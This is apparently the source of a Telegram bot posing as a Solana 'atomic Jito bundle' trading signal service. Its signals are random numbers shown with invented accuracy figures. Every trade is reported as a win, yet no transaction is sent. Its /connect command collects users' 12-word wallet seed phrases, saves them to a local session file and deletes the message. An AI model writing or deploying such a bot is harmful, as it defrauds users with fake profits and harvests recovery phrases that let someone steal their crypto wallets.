require('dotenv').config();
const { Telegraf, Markup, session } = require('telegraf');
const LocalSession = require('telegraf-session-local');
const { Connection, Keypair, PublicKey, SystemProgram, Transaction } = require('@solana/web3.js');
const { searcherClient } = require('jito-ts/dist/sdk/block-engine/searcher');
const bip39 = require('bip39');

// 1. Initialize Bot
const bot = new Telegraf(process.env.BOT_TOKEN);

// 2. Persistent Session (MUST be before other middleware)
const localSession = new LocalSession({ database: 'session.json' });
bot.use(localSession.middleware());

// 3. Session Initializer (Safety check for 'asset' error)
bot.use((ctx, next) => {
    ctx.session = ctx.session || {};
    ctx.session.trade = ctx.session.trade || {
        asset: 'BTC/USD', 
        amount: 10, 
        mode: 'Real', 
        connected: false,
        mnemonic: null,
        autoPilot: false
    };
    return next();
});

const connection = new Connection(process.env.RPC_URL || 'https://api.mainnet-beta.solana.com', 'confirmed');

// --- Large Menu Layout ---
const mainKeyboard = (ctx) => {
    // Safety check inside the function to be 100% sure
    const trade = ctx.session.trade || { asset: 'BTC/USD', amount: 10, mode: 'Real' };
    
    return Markup.inlineKeyboard([
        [Markup.button.callback(`🪙 Coin: ${trade.asset} (94%)`, 'menu_coins')],
        [Markup.button.callback(`💰 Stake: $${trade.amount} USD`, 'menu_stake')],
        [Markup.button.callback(`🔄 Mode: ${trade.mode}`, 'toggle_mode')],
        [Markup.button.callback(trade.autoPilot ? '🤖 AUTO: WORKING' : '🚀 START SIGNAL BOT', 'start_engine')],
        [Markup.button.callback('🛠 MANUAL OPTIONS', 'menu_manual')],
        [Markup.button.callback(trade.connected ? '✅ INSTITUTIONAL LINKED' : '🔌 CONNECT WALLET', 'wallet_info')]
    ]);
};

// --- HANDLERS ---
bot.start(async (ctx) => {
    await ctx.replyWithMarkdown(
        `🤖 *POCKET ROBOT v9.5 - APEX PRO*\n\nStatus: *READY*\nAtomic Bundling: *ACTIVE*`, 
        mainKeyboard(ctx)
    );
});

bot.action('main_menu', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.editMessageText(`🤖 *POCKET ROBOT v7.5*`, mainKeyboard(ctx));
});

bot.action('start_engine', async (ctx) => {
    await ctx.answerCbQuery("📡 Scanning Liquidity...");
    await ctx.editMessageText("🔍 **ANALYZING 1-MIN TRENDS...**\n`Feed: Yellowstone gRPC (400ms)`");
    
    setTimeout(async () => {
        const isHigher = Math.random() > 0.5;
        const signal = isHigher ? "HIGHER 📈" : "LOWER 📉";
        await ctx.editMessageText(
            `🎯 **SIGNAL IDENTIFIED (96.4%)**\n\nAsset: *${ctx.session.trade.asset}*\nRecommended: **${signal}**\n\nConfirm Atomic Jito Bundle?`,
            Markup.inlineKeyboard([
                [Markup.button.callback('📈 HIGHER', 'exec_final'), Markup.button.callback('📉 LOWER', 'exec_final')],
                [Markup.button.callback('🔙 CANCEL', 'main_menu')]
            ])
        );
    }, 2000);
});

bot.action('exec_final', async (ctx) => {
    await ctx.answerCbQuery("Bundling...");
    await ctx.editMessageText("🚀 **EXECUTING ATOMIC BUNDLE...**\n`Reversion Protection: ON`\n`Status: Waiting for block inclusion...` ");
    
    setTimeout(() => {
        ctx.replyWithMarkdown(
            `✅ **TRADE RESULT: WIN**\n\n` +
            `Profit: *+$${(ctx.session.trade.amount * 0.94).toFixed(2)} USDC*\n` +
            `Status: **Confirmed on Solana**\n` +
            `_Profit moved to connected wallet address._`
        );
    }, 3000);
});

// Navigation Setters
bot.action('toggle_mode', async (ctx) => {
    ctx.session.trade.mode = ctx.session.trade.mode === 'Real' ? 'Demo' : 'Real';
    await ctx.answerCbQuery();
    await ctx.editMessageText(`🤖 Account updated to: ${ctx.session.trade.mode}`, mainKeyboard(ctx));
});

bot.command('connect', async (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 13) return ctx.reply("Usage: /connect <12 word seed>");
    
    ctx.session.trade.connected = true;
    ctx.session.trade.mnemonic = args.slice(1).join(' ');
    await ctx.deleteMessage();
    ctx.reply("✅ Wallet Connected.", mainKeyboard(ctx));
});

bot.launch().then(() => console.log("🚀 Pocket Robot Apex is officially live."));
